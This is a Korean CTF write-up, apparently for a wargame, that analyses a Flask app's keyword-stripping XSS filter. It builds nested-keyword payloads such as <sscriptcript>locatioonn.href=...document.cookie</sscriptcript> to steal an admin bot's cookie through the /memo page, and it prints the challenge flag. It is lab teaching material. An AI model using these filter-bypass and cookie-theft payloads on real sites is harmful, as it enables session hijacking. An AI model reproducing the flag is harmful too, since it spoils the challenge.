# XSS Filtering Bypass

## 1. 문제

**XSS Filtering Bypass**는 XSS 필터링이 적용된 웹 페이지에서 **필터의 동작 방식을 분석하고 우회하여 관리자 쿠키에 저장된 FLAG를 획득하는 문제**이다.

### 주요 페이지

| 페이지  | 기능                                          |
| ------- | --------------------------------------------- |
| `/vuln` | 사용자 입력값을 필터링한 후 출력              |
| `/memo` | `memo` 파라미터를 페이지에 출력               |
| `/flag` | 입력한 XSS payload를 관리자 브라우저에서 실행 |

![alt text](image-1.png)

---

## app.py 분석

### 2. `/vuln`

vuln 페이지를 살펴보면,
![alt text](image-2.png)

이미지 상으로는 단순하게 이미지를 출력하는 페이지로 보인다.
또한 GET방식을 사용하는것을 보아, param저 변수가 취약한 파라미터가 될 수 있을것이라고 생각된다.

코드를 살펴보면,
`/vuln`에서는 GET 방식으로 `param` 값을 전달받는다.

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    param = xss_filter(param)
    return param
```

사용자가 입력한 `param`은 `xss_filter()`를 거친 후 그대로 페이지에 출력된다.

## 따라서 `param`이 XSS 공격에 사용될 수 있는 취약한 입력값이라고 판단할 수 있다.

### 3. XSS 필터 확인

필터 함수는 다음과 같다.

```python
def xss_filter(text):
    _filter = ["script", "on", "javascript:"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text
```

다음 문자열을 필터링한다.

```text
script
on
javascript:
```

param 파라미터를 바꿔보기위해 처음에는 아래와 같은 기본적인 XSS payload를 입력할 수 있다.

```html
<script>
  alert(1);
</script>
```

![alt text](image-3.png)
하지만 `script` 문자열이 제거되기 때문에 정상적으로 실행되지 않는다.
xss_filter에 의해서 필터링되는것을 확인할 수 있다.

vuln 함수에서 xss_filter() 함수를 호출하고 있는데,

def xss_filter(text):
\_filter = ["script", "on", "javascript:"]
for f in \_filter:
if f in text.lower():
text = text.replace(f, "")
return text
xss_filter() 함수에서 script, on, javascript: 라는 키워드를 필터링하고 있기 때문이다.

---

### 4. `script` 필터 우회

필터는 특정 문자열을 발견하면 단순히 `""`로 치환한다.

```python
text = text.replace(f, "")
```

53행을 보면 해당 키워드를 ""로 치환하고 있으므로 우회하기 쉽다.
따라서 제거된 뒤에 원하는 문자열이 만들어지도록 입력값을 구성할 수 있다.

예를 들어:

```text
scscriptript
```

에서 `script`를 제거하면:

```text
script
```

가 된다.

이를 이용하여 다음과 같은 payload를 만들 수 있다.

```html
<sscriptcript>alert(1)</sscriptcript>
```

필터가 `script`를 제거하면:

```html
<script>
  alert(1);
</script>
```

가 되어 JavaScript가 실행된다.
![alt text](image-4.png)

---

## 5. FLAG를 얻기 위한 방법

단순히 `alert(1)`을 실행하는 것만으로는 FLAG를 얻을 수 없다.

문제의 `/flag` 코드를 보면,

```python
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")

        if not check_xss(
            param,
            {"name": "flag", "value": FLAG.strip()}
        ):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'
```

POST 요청으로 전달된 `param`은 `check_xss()`로 전달된다.

이때 다음과 같이 쿠키를 설정한다.

```python
{"name": "flag", "value": FLAG.strip()}
```

즉, 관리자 브라우저의 쿠키에 다음과 같이 FLAG가 들어간다.

```text
flag=DH{...}
```

---

## 6. 관리자 브라우저 분석

`check_xss()`를 확인한다.

```python
def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
```

이 함수는 입력한 payload를 `/vuln`으로 전달하면서 `read_url()`을 호출한다.

`read_url()`에서는 Selenium을 이용하여 Chrome 브라우저를 실행한다.

```python
driver = webdriver.Chrome(...)
driver.get("http://127.0.0.1:8000/")
driver.add_cookie(cookie)
driver.get(url)
```

실행 순서:

```text
관리자 Chrome 실행
      ↓
http://127.0.0.1:8000/ 접속
      ↓
flag 쿠키 추가
      ↓
사용자가 제출한 /vuln URL 접속
      ↓
XSS payload 실행
```

따라서 XSS를 성공시키면 **관리자 브라우저에서 `document.cookie`를 읽을 수 있다.**

---

## 7. `/memo`를 이용한 FLAG 출력

`/memo` 코드를 확인한다.

```python
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)
```

`memo` 파라미터에 전달한 값이 페이지에 출력된다.

예를 들어:

```text
/memo?memo=123
```

을 요청하면 페이지에 `123`이 출력된다.
페이로드를 작성해서 이 페이지에서 바로 출력할려고 시도 하였으나, 잘 동작하지 않습니다.

따라서 관리자 브라우저에서 쿠키를 읽은 뒤 `/memo`로 전달하면 FLAG를 확인할 수 있다.

---

## 8. 기본 XSS Payload

memo 파라미터에 입력된 값이 memo_text에 추가되어 memo.html을 렌더링할 때 출력되는 것을 알 수 있었다.
memo 파라미터에 hello 라는 문자열 대신 쿠키에 들어있는 값을 전달하면 memo페이지에서 쿠키 값을 볼 수 있을 것이다.

따라서 flag 페이지에서 입력할 페이로드는 다음과 같다.

<script>location.href="/memo?memo="+document.cookie</script>

목표는 다음 JavaScript를 관리자 브라우저에서 실행하는 것이다.

```javascript
location.href = "/memo?memo=" + document.cookie;
```

각 부분의 의미는 다음과 같다.

### `<script>`

```html
<script>
  ...
</script>
```

태그 내부의 내용을 JavaScript 코드로 실행한다.

<script></script>는 XSS 공격 시 많이 사용되는 태그로, 태그 사이에 들어있는 내용은 자바스크립트 코드로 인식된다.

### `location.href`

location.href는 자바스크립트에서 현재 페이지의 url을 나타내는 속성이다.
현재 페이지의 URL을 변경하는 데 사용한다.

```javascript
location.href = "/memo";
```

location.href에 현재 페이지의 url이 아닌 다른 url을 입력하면 그 url로 리다이렉션(해당 url로 이동)한다.
위와 같이 사용하면 `/memo` 페이지로 이동한다.

### `document.cookie`

document.cookie는 자바스크립트에서 현재 페이지의 쿠키를 나타내는 프로퍼티이다.
현재 페이지에서 JavaScript가 접근할 수 있는 쿠키 값을 가져온다.

따라서:

```javascript
location.href = "/memo?memo=" + document.cookie;
```

를 실행하면 쿠키 값을 `memo` 파라미터에 넣어서 `/memo`로 이동하게 된다.

---

## 9. `on` 필터 우회

그러나 xss_filter() 함수가 있기 때문에 다음과 같은 페이로드를 그대로 입력하면 공격이 먹히지 않는다.

```html
<script>
  location.href = "/memo?memo=" + document.cookie;
</script>
```

이유는 필터가 `script`뿐만 아니라 `on`도 제거하기 때문이다.

```python
_filter = ["script", "on", "javascript:"]
```

`location`에는 `on`이 포함되어 있다.

따라서 `location`을 그대로 입력하면 필터에 의해 변경된다.

이를 우회하기 위해 `on`을 제거한 뒤 `location`이 만들어지도록 작성한다.

```text
locatioonn
```

여기서 `on`을 제거하면:

```text
location
```

이 된다.

---

## 10. 최종 XSS Payload

`script`와 `on` 필터를 모두 우회하도록 구성한다.

```html
<sscriptcript>locatioonn.href="/memo?memo="+document.cookie;</sscriptcript>
```

필터 적용 과정을 보면:

### 입력값

```html
<sscriptcript>locatioonn.href="/memo?memo="+document.cookie;</sscriptcript>
```

### `script` 제거

```html
<script>
  locatioonn.href = "/memo?memo=" + document.cookie;
</script>
```

### `on` 제거

```html
<script>
  location.href = "/memo?memo=" + document.cookie;
</script>
```

최종적으로 정상적인 XSS 코드가 완성된다.

```html
<scscriptript>locatioonn.href="memo?memo="+document.cookie</scscriptript>
```

이렇게 필터링을 우회한 페이로드를 보낼 것이다.

---

## 11. 최종 Payload

```html
<sscriptcript>locatioonn.href="/memo?memo="+document.cookie;</sscriptcript>
```

![alt text](image-5.png)

실행 결과 `/memo`에서 관리자 쿠키가 출력되고, 쿠키의 `flag` 값으로 FLAG를 확인할 수 있다.

```text
flag=DH{81cd7cb24a49ad75b9ba37c2b0cda4ea}
```

## ![alt text](image.png)
